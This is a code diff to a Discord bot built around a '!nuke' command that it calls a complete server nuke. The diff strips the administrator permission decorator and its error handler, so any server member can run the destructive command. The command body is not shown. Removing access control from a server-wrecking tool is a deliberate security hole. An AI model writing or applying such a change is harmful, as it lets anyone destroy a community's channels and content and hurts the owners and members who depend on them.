@@ -19,7 +19,6 @@ async def on_ready():
     print(f'Bot is ready to nuke! Use !nuke command')
 
 @bot.command(name='nuke')
-@commands.has_permissions(administrator=True)
 async def nuke(ctx):
     """
     Complete server nuke command
@@ -147,16 +146,6 @@ async def nuke(ctx):
             await ctx.send(embed=embed_error)
         except:
             pass
-
-@nuke.error
-async def nuke_error(ctx, error):
-    if isinstance(error, commands.MissingPermissions):
-        embed = discord.Embed(
-            title="❌ ERROR",
-            description="You need Administrator permission to use !nuke",
-            color=discord.Color.red()
-        )
-        await ctx.send(embed=embed)
 
 # Run bot
 if __name__ == "__main__":
